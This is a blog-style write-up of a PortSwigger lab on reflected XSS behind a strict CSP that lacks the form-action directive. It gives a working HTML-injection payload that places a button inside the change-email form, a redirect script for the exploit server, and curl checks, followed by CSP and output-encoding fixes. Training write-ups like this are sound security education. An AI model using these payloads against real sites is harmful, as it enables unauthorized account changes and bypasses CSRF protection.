---
layout: post
title: "Reflected XSS Protected by Very Strict CSP, with Dangling Markup Attack"
date: 2027-06-22 09:00:00 -0500
categories: [PortSwigger, XSS]
tags: [xss, dangling-markup, csp, form-action, csrf-bypass, html-injection, portswigger]
---

## Overview

PortSwigger lab: *Reflected XSS protected by very strict CSP, with dangling markup attack.*

The application reflects user input into an HTML form attribute and has a Content Security Policy that blocks scripts, external images, and base tags — but is missing the `form-action` directive. Injecting a button into the existing form lets a victim bot submit the form same-origin with its own real CSRF token, bypassing CSRF protection without exfiltrating the token.

**[CWE-79](https://cwe.mitre.org/data/definitions/79.html)** — HTML Injection / Reflected XSS.
**[CWE-352](https://cwe.mitre.org/data/definitions/352.html)** — CSRF via form hijacking.

---

## The technique

The `/my-account` page reflects the `email` GET parameter raw into an input's `value` attribute inside the change-email form:

```html
<form action="/my-account/change-email" method="POST">
    <input required type="email" name="email" value="[USER INPUT]">
    <input required type="hidden" name="csrf" value="AbCdEfGhIjKlMnOp">
</form>
```

The Content Security Policy on the page:

```
default-src 'self'; object-src 'none'; style-src 'self';
script-src 'self'; img-src 'self'; base-uri 'none'
```

At first glance this looks airtight — no inline scripts, no external resources, `base-uri 'none'` to block base-tag tricks. But `form-action` is absent. That directive is the only CSP mechanism that restricts where a form may submit. Without it, any form on the page can submit anywhere.

---

## Attack flow

**Step 1 — break out of the attribute and inject a button**

Inject into the `email` parameter:

```
hacker@evil-user.net"><button class=button>Click me</button>
```

URL-encoded:

```
hacker%40evil-user.net%22%3E%3Cbutton%20class%3Dbutton%3EClick%20me%3C%2Fbutton%3E
```

The page now renders:

```html
<form action="/my-account/change-email" method="POST">
    <input required type="email" name="email" value="hacker@evil-user.net">
    <button class=button>Click me</button>">
    <input required type="hidden" name="csrf" value="AbCdEfGhIjKlMnOp">
</form>
```

The `">` breaks out of the `value` attribute. The injected `<button>` lands inside the form. The CSRF token is still there, also inside the form.

**Step 1b — verify the injection before delivering (saves iteration)**

```bash
curl -sk "https://TARGET/my-account?email=hacker%40evil-user.net%22%3E%3Cbutton%20class%3Dbutton%3EClick%20me%3C%2Fbutton%3E" \
  -b cookies.txt | grep -o '<button[^>]*>Click me</button>'
```

If this returns `<button class=button>Click me</button>`, the breakout is live and the button is inside the form. If it returns nothing, the parameter name or path is wrong.

**Step 2 — redirect the bot to the injected page**

Host this on the exploit server:

```html
<script>
location='https://TARGET/my-account?email=hacker%40evil-user.net%22%3E%3Cbutton%20class%3Dbutton%3EClick%20me%3C%2Fbutton%3E';
</script>
```

Deliver to victim. The bot visits the exploit server, gets redirected to the lab page (same origin), and sees the rendered "Click me" button. PortSwigger's bot clicks any visible element whose label contains "Click".

**Step 3 — form submits same-origin with the real CSRF token**

The bot is on the lab page (not the exploit server), so the form submission goes to `/my-account/change-email` from the lab origin. The `Origin` header is the lab domain. The real CSRF token is submitted. Email changed.

---

## Why cross-origin submission fails

The change-email endpoint validates the `Origin` header. If the form were submitted directly from `exploit-server.net`, the `Origin: https://exploit-server.net` header triggers a 400 rejection. The trick is making the submission come from inside the lab origin — which is exactly what the redirect achieves.

```bash
curl -s -X POST 'https://TARGET/my-account/change-email' \
  -H 'Origin: https://exploit-server.net' \
  --data 'email=test@test.com&csrf=ValidToken' \
  -b cookies.txt -o /dev/null -w "%{http_code}"
# → 400
```

The same POST with `Origin: https://TARGET` returns 302 (redirect on success).

---

## Why classic dangling markup fails here

The traditional dangling markup approach uses `<base target='attacker_window'>` to route a form's submission to a window the attacker controls, then reads the page source (including the CSRF token) from `window.name` on navigation. Chrome 88+ clears `window.name` on every cross-origin navigation — so the token never arrives at the attacker's window. The same-origin button injection sidesteps this entirely: no token exfiltration needed.

---

## Recon checklist

1. Check the CSP header for `form-action` — if it is absent, forms are unrestrained.
2. Confirm HTML injection in the reflected param: send `"><b>test</b>` and view source — if `<b>` is rendered unescaped inside the HTML body, the breakout works.
3. View source to confirm the injection point is inside a `<form>` block with a CSRF token already present.

---

## Curl delivery gotcha

`curl -X POST ... -L` keeps POST through redirects (curl applies `-X` to every request in the chain). The `/deliver-to-victim` endpoint expects a GET. Use `curl -L` without `-X POST`:

```bash
curl -L 'https://exploit-server.net/deliver-to-victim'
```

---

## Fix

Add `form-action 'self'` to the CSP:

```
Content-Security-Policy: default-src 'self'; object-src 'none'; style-src 'self';
  script-src 'self'; img-src 'self'; base-uri 'none'; form-action 'self'
```

Also encode reflected parameters before writing them into HTML attributes:

```php
// before
echo '<input value="' . $_GET['email'] . '">';

// after
echo '<input value="' . htmlspecialchars($_GET['email'], ENT_QUOTES) . '">';
```

Encoding stops the attribute breakout; `form-action 'self'` stops the form hijacking even if something slips through.
